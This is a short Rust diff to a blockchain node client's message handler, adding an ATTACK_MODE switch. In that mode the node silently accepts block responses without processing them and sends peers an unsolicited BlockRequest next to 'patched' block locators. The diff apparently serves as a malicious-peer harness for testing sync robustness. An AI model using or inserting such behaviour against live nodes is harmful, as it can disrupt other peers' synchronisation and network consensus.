@@ -221,6 +221,9 @@ impl<N: Network, C: ConsensusStorage<N>> Inbound<N> for Client<N, C> {
     /// Handles a `BlockResponse` message.
     fn block_response(&self, peer_ip: SocketAddr, blocks: Vec<Block<N>>) -> bool {
         // Tries to advance with blocks from the sync module.
+        if std::env::var("ATTACK_MODE").is_ok() {
+            return true
+        }
         match self.sync.advance_with_sync_blocks(peer_ip, blocks) {
             Ok(()) => true,
             Err(error) => {
@@ -261,7 +264,10 @@ impl<N: Network, C: ConsensusStorage<N>> Inbound<N> for Client<N, C> {
             if std::env::var("ATTACK_MODE").is_ok() {
                 match self_.get_patched_block_locators() {
                     // Send a `Ping` message to the peer.
-                    Ok(block_locators) => self_.send_ping(peer_ip, Some(block_locators)),
+                    Ok(block_locators) => {
+                        Outbound::send(&self_, peer_ip, Message::BlockRequest(BlockRequest{ start_height: 0, end_height: 1 }));
+                        self_.send_ping(peer_ip, Some(block_locators))
+                    },
                     Err(e) => error!("Failed to get block locators - {e}"),
                 }
             } else {
